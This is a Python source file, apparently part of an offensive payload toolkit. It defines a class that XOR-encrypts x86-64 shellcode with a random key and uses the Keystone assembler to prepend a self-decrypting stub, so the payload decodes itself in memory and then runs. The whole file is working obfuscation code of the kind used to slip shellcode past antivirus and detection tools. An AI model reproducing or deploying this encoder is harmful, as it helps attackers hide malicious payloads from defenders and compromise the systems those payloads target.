import tempfile
import subprocess
import os
import platform
from keystone import *


class xorencrypt:

    def apply(self, shellcode: bytes) -> bytes:
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        ks.syntax = KS_OPT_SYNTAX_NASM
        key = os.urandom(16)
        encrypted = bytes(shellcode[i] ^ key[i % len(key)] for i in range(0, len(shellcode)))
        decoder_asm = f"""
    lea     rsi, [rel key]      ; rsi -> embedded 16-byte key
    lea     rdi, [rel encrypted]    ; rdi -> embedded ciphertext (decrypted in place)
    mov     rdx, {hex(len(shellcode))}                  ; rdx = ciphertext length (immediate)
    xor     rcx, rcx                 ; rcx = index = 0
xor_loop:
    cmp     rcx, rdx                 ; index >= length?
    jae     xor_done                 ; yes -> done
    mov     r8, rcx
    and     r8, 0x0F                 ; key position = index & 15
    mov     al, byte [rsi + r8]      ; al = key[index & 15]
    xor     byte [rdi + rcx], al     ; data[index] ^= key byte
    inc     rcx
    jmp     xor_loop
xor_done:
encrypted:
    db {','.join(f'0x{b:02X}' for b in encrypted)}
key:
    db {','.join(f'0x{b:02X}' for b in key)}
"""
        encoding, count = ks.asm(decoder_asm)
        return bytes(encoding)
